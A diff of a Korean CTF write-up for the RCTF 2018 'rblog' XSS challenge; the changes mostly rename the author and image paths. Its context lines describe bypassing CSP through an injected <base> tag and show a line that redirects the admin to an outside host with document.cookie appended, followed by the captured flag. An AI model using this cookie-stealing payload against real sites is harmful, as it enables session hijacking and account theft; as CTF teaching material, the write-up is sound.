@@ -7,7 +7,7 @@ tags:
   - Write-up
   - CTF
   - RCTF2018
-  - ccoma
+  - mingzzi
 ---
 
 `rblog`는 `RCTF 2018`에 출제되었던 XSS 문제인데, 대회 기간에는 풀이하지 못했다가 Write-up이 올라온 후 풀어보게 되었다.  
@@ -25,7 +25,7 @@ http://rblog.2018.teamrois.cn
 
 문제 링크에 접속하면 아래와 같은 페이지를 확인할 수 있다.  
 
-![]({{ site.baseurl }}/images/ccoma/rblog-writeup/rblog_01.PNG)  
+![]({{ site.baseurl }}/images/mingzzi/rblog-writeup/rblog_01.PNG)  
 
 제목과 내용을 적고, 스타일을 적용하거나 이미지를 업로드할 수 있는 기능이 있다.  
 
@@ -33,9 +33,9 @@ http://rblog.2018.teamrois.cn
 
 admin에게 신고할 때에는 특정 값을 입력해야 하는데, 이는 내가 업로드 한 블로그의 주소라는 것을 알 수 있다.  
 
-![]({{ site.baseurl }}/images/ccoma/rblog-writeup/rblog_02.PNG)  
+![]({{ site.baseurl }}/images/mingzzi/rblog-writeup/rblog_02.PNG)  
 
-![]({{ site.baseurl }}/images/ccoma/rblog-writeup/rblog_03.PNG)  
+![]({{ site.baseurl }}/images/mingzzi/rblog-writeup/rblog_03.PNG)  
 
 ### 2. 취약점 찾기
 
@@ -43,11 +43,11 @@ admin에게 신고할 때에는 특정 값을 입력해야 하는데, 이는 내
 
 때문에 어떤 부분에서 `XSS`가 가능한지 알기 위해 `title`, `content`, `style`을 적용하는 부분에 아래와 같이 script 코드를 삽입 해 보았다.  
 
-![]({{ site.baseurl }}/images/ccoma/rblog-writeup/rblog_04.PNG)  
+![]({{ site.baseurl }}/images/mingzzi/rblog-writeup/rblog_04.PNG)  
 
 그 결과, `title` 부분에서 `script`가 정상적으로 삽입되는 것을 확인할 수 있었지만, 실행되지는 않았다.  
 
-![]({{ site.baseurl }}/images/ccoma/rblog-writeup/rblog_05.PNG)  
+![]({{ site.baseurl }}/images/mingzzi/rblog-writeup/rblog_05.PNG)  
 
 이 문제에도 역시나 `CSP`가 걸려있었다.  
 
@@ -55,7 +55,7 @@ admin에게 신고할 때에는 특정 값을 입력해야 하는데, 이는 내
 
 문제의 URL을 넣고 확인 해 보니 `base-uri`에 대한 보호가 적용되어 있지 않았다.  
 
-![]({{ site.baseurl }}/images/ccoma/rblog-writeup/rblog_06.PNG)  
+![]({{ site.baseurl }}/images/mingzzi/rblog-writeup/rblog_06.PNG)  
 
 즉, `<base>`라는 태그를 사용하여 소스코드 상에서 사용된 상대 경로의 기준이 될 경로를 지정할 수 있다.  
 
@@ -69,7 +69,7 @@ admin에게 신고할 때에는 특정 값을 입력해야 하는데, 이는 내
 
 다시 소스코드를 살펴보니 내가 업로드 한 블로그 글의 하단에서 아래와 같이 `js` 파일을 실행시키는 것을 확인할 수 있었다.  
 
-![]({{ site.baseurl }}/images/ccoma/rblog-writeup/rblog_07.PNG)  
+![]({{ site.baseurl }}/images/mingzzi/rblog-writeup/rblog_07.PNG)  
 
 따라서 `<base>` 태그를 이용 해 기준 경로를 바꾸어 준 후, 바꾼 경로에 `/assets/js/jquery.min.js` 파일을 만든다면, 내가 원하는 코드를 실행시킬 수 있게 된다.  
 
@@ -91,19 +91,19 @@ location.href = "http://ccoma.me/?" + document.cookie;
 
 먼저 아래와 같이 글을 올려 보았다.  
 
-![]({{ site.baseurl }}/images/ccoma/rblog-writeup/rblog_08.PNG)  
+![]({{ site.baseurl }}/images/mingzzi/rblog-writeup/rblog_08.PNG)  
 
 `jquery.min.js`에는 `location.href`가 구현되어 있기 때문에 내 서버로 리다이렉트 될 것이다.  
 
 때문에 `burp suite`를 이용 해 `Response`를 잡아 블로그 글의 주소를 캡쳐 했다.  
 
-![]({{ site.baseurl }}/images/ccoma/rblog-writeup/rblog_09.PNG)  
+![]({{ site.baseurl }}/images/mingzzi/rblog-writeup/rblog_09.PNG)  
 
 이 후 해당 글의 링크를 `admin`에게 보내주었다.  
 
-![]({{ site.baseurl }}/images/ccoma/rblog-writeup/rblog_10.PNG)  
+![]({{ site.baseurl }}/images/mingzzi/rblog-writeup/rblog_10.PNG)  
 
-![]({{ site.baseurl }}/images/ccoma/rblog-writeup/rblog_11.PNG)  
+![]({{ site.baseurl }}/images/mingzzi/rblog-writeup/rblog_11.PNG)  
 
 그러면 `admin`이 내 서버로 접근하게 되는데, 이 때 GET 방식으로 cookie가 넘어오게 되므로 이를 확인하기 위해 `access.log`를 확인 해 보았다.  
 
@@ -113,7 +113,7 @@ tail -f /var/log/apache2/access.log
 
 전송 후에 짧게는 몇 초, 길게는 2분 정도를 기다리면 아래와 같이 flag가 함께 전송된 것을 확인할 수 있다.  
 
-![]({{ site.baseurl }}/images/ccoma/rblog-writeup/rblog_12.PNG)  
+![]({{ site.baseurl }}/images/mingzzi/rblog-writeup/rblog_12.PNG)  
 
 ```
 FLAG : RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012}
